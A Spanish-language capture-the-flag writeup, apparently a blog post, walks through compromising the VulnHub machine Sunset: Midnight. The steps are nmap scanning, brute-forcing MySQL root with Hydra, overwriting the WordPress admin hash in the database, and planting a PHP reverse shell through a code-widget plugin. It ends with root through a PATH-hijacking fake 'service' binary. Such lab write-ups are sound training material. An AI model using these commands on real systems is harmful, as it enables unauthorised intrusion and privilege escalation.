---
title: "Sunset: Midnight – Writeup sin Metasploit (VulnHub)"
description: "Guía paso a paso para resolver la máquina Sunset: Midnight de VulnHub sin Metasploit: enumeración, explotación web en CMS y escalada de privilegios a root."
pubDate: "2023-05-23"
author: "EVLBYTE"
tags: ["CTF", "Escalada de Privilegios", "OSCP PREP", "Sin Metasploit", "Sunset Midnight", "VulnHub", "Web Exploitation", "WriteUp"]
category: "Ciberseguridad"
heroImage: "/images/2023_05_image-36.png"
draft: false
---

Esta es una maquina de Clasificada como "intermedia" en VulnHub: VulnHub - Sunset Midnight. En esta maquina encontraremos una vulnerabilidad que explotaremos para poder ingresar al CMS el cual nos dara acceso a la maquina a través de un plugin.

## 1. Descubrimiento y Enumeración de la Red

Como primer paso debemos realizar el descubrimiento de la red para conocer los posibles host que utilizaremos en este momento

![Imagen técnica](/images/2023_05_image-36.png)

realizamos un escaneo de puertos con el siguiente comando:

```bash
sudo nmap -n -Pn -p- --open -sS -T 5 -O 192.168.56.107 -oX PuertosAbiertos.xml
sudo xsltproc PuertosAbiertos.xml -o puertosabiertos.html
```

y obtendremos un reporte fácil de leer en html:

![Imagen técnica](/images/2023_05_image-37.png)

Encontramos los puertos 22 (SSH), 80(HTTP) y 3306(mysql), por lo que procedemos a realizar una inspección rápida dentro del puerto 80.

El sitio tiene una redirección hacia el URL sunset-midnigth por lo que procederemos a agregarlo al archivo hosts del equipo para poder resolver el dominio de forma correcta:

![Imagen técnica](/images/2023_05_image-38.png)

```bash
sudo su
echo 192.168.56.107 sunset-midnight >> /etc/hosts
exit
```

Lo que nos permitirá abrir de forma correcta el sitio web alojado dentro del servidor victima:

![Imagen técnica](/images/2023_05_image-39.png)

para enumerar vulnerabilidades en la versión de wordpress utilizada utilizaremos la siguiente herramienta. WPSCAN utilizando el siguiente comando

```bash
wpscan --url http://sunset-midnight/ -e u -o datos_wordpress.txt --api-token xxxxxxxxxxxxxxxxxxxxxxxxxx -v
```

El cual nos generara un archivo de texto que podremos utilizar para hacer el reporte final, en este caso logramos validar que dentro de la aplicación de WordPress existe un usuario llamado admin.

## 2. Explotación y Análisis de Vulnerabilidades Web

![Imagen técnica](/images/2023_05_image-40.png)

El cual podemos intentar utilizar con un ataque de fuerza bruta con el siguiente comando:

```bash
wpscan --url http://sunset-midnight/ --passwords ../../OneDrive/Tools/rockyou.txt --usernames admin
```

![Imagen técnica](/images/2023_05_image-42.png)

Como podemos ver el ataque de fuerza bruta al password del usuario admin puede tardar varias horas, por lo que intentaremos mientras otro vector de ataque, en este caso intentaremos un bruteforce al puerto 3306 (mysql) con el usuario root.

```bash
hydra 192.168.56.107 -l root -P /home/milo/rockyou.txt -t 4 mysql
```

![Imagen técnica](/images/2023_05_image-43.png)

y encontramos un password que podemos usar para intentar explorar que información podemos obtener de esa base de datos.

```bash
mysql -h 192.168.56.107 -u root -p
```

![Imagen técnica](/images/2023_05_image-44.png)

Utilizaremos estos comandos dentro del sql para verificar si podemos explotar alguna base de datos o una tabla

```sql
show databases;
show tables;
select * from wp_users;
UPDATE wp_users SET user_pass = "e10adc3949ba59abbe56e057f20f883e" where ID=1;
select * from wp_users;
```

![Imagen técnica](/images/2023_05_image-45.png)

![Imagen técnica](/images/2023_05_image-46.png)

![Imagen técnica](/images/2023_05_image-47.png)

como podemos ver, existe la contraseña del usuario admin, generamos una clave nueva en md5 en cualquier pagina. como ejemplo podemos usar: md5hashgenerator.com

en mi caso generé un hash en md5 para el texto 123456

![Imagen técnica](/images/2023_05_image-48.png)

Ya con el hash generado podemos entonces editar el registro de pasword de la tabla para permitirnos ingresar al dashboard de Wordpress a travez de la pagina web.

![Imagen técnica](/images/2023_05_image-49.png)

## 3. Ganando Acceso Inicial al Servidor (Reverse Shell)

![Imagen técnica](/images/2023_05_image-50.png)

Usando las credenciales modificadas podemos ingresar directamente al panel de administración.

![Imagen técnica](/images/2023_05_image-51.png)

Existen varias técnicas para ganar acceso al servidor desde el panel de administración, en este caso trabajaremos 2, la primera y la mas fácil es modificar desde la interfaz de WordPress archivos PHP que podamos utilizar como pivote insertando código malicioso que nos permita acceder al servidor con una consola reversa.  Debemos ingresar al la siguiente ruta en el menú de la izquierda:

```bash
Appearance > Theme Editor > 404 Template
```

Debido a una instalación defectuosa del WordPress al intentar modificar algún archivo PHP del tema no nos permite modificar archivos directamente desde el php

![Imagen técnica](/images/2023_05_image-52.png)

por lo que optaremos por ejecutar la segunda función, la cual es descargar un plugin desde la pagina oficial de WordPress  (php-code-widget) que nos permite agregar código PHP y desde allí podremos insertar nuestro código malicioso para realizar la conexión reversa.

Ya que hemos descargado el plugin tendremos en la carpeta un archivo similar a este: php_code_widget.2.4.zip por lo que únicamente nos queda cargarlo dentro del sitio web, para esto iremos a la siguiente ruta dentro del menú que esta en el lateral izquierdo de la pagina de administración:

```bash
Plugins > Add New > Upload Plugin
```

cargamos el archivo .zip que acabamos de descargar y damos clic al botón Install Now

![Imagen técnica](/images/2023_05_image-53.png)

Activamos el plugin desde el botón azul, y luego nos dirigimos a la siguiente ruta dentro del menú que esta en el lateral izquierdo:

```bash
Appearance > Widgets
```

![Imagen técnica](/images/2023_05_image-54.png)

en esta pantalla debemos arrastrar el Widget PHP Code hacia la parte de Footer 1, mejor si es abajo del Widget existente

![Imagen técnica](/images/2023_05_image-55.png)

ahora procedemos a editar el widget con el código malicioso. únicamente copiando el contenido del script de PHP que podemos encontrar en el repositorio de Pentest Monkey  y guardamos la configuración

![Imagen técnica](/images/2023_05_image-56.png)

Esto nos permitirá insertar la sección del footer de cada pagina el código de conexión. El cual podemos verificar al cargar la pagina obtenemos al final de todo este texto.

![Imagen técnica](/images/2023_05_image-57.png)

por lo que ahora únicamente nos resta colocar nuestra maquina de atacante en escucha para obtener la sesión de consola remota.

![Imagen técnica](/images/2023_05_image-58.png)

## 4. Escalada de Privilegios Local

Tal como hemos venido trabajando utilizaremos algunos scripts que pudieran ayudarnos a validar si tenemos algún vector conocido sobre el cual podamos trabajar un proceso de escalación de privilegios. Usaremos Linux Smart Enumeration, el cual lo podemos obtener desde el repositorio de https://github.com/diego-treitos/linux-smart-enumeration

![Imagen técnica](/images/2023_05_image-59.png)

encontramos que tenemos acceso a un binario que no es muy común llamado status, el cual cuando corremos vemos que corre internamente el comando service ssh status

![Imagen técnica](/images/2023_05_image-60.png)

Por lo que podemos hacer un ataque de suplantación de apps modificando el PATH del usuario. Para esto nos posicionaremos en la carpeta /tmp y a continuación crearemos un archivo llamado service el cual correrá una línea en bash que nos permitirá ejecutar una consola con privilegios de root. la forma mas simple de hacer esto es con el comando echo

```bash
echo "/bin/bash -p" > service
```

ahora debemos darle permisos de ejecución al archivo que acabamos de crear con

```bash
chmod +x service
```

agregamos una entrada al PATH para que coloque la carpeta donde esta el script malicioso que acabamos de crear.

```bash
export PATH=$(pwd):$PATH
```

Ya con esto únicamente nos queda correr nuevamente el script al cual el usuario tiene acceso, en este caso específicamente es /usr/bin/status y con esto tendremos acceso al root del equipo.

![Imagen técnica](/images/2023_05_image-61.png)

![Imagen técnica](/images/2023_05_image-62.png)

## 5. Conclusiones y Lecciones Aprendidas

Enumeraremos lo aprendido en este equipo.

1. Aprendimos a solucionar problemas de re-direccionamiento por DNS
2. Aprendimos a "utilizar" de forma basica la herramienta WPscan
3. Aprendimos a hacer un ataque de brute-force a una base de datos
4. Aprendimos a aprovechar acceso de editor en WordPress para ganar acceso al equipo
5. Aprendimos a cargar plugins en WordPress
6. Aprendimos a realizar un método de escalación de privilegios utilizando suplantación de binarios y modificación del PATH del usuario.
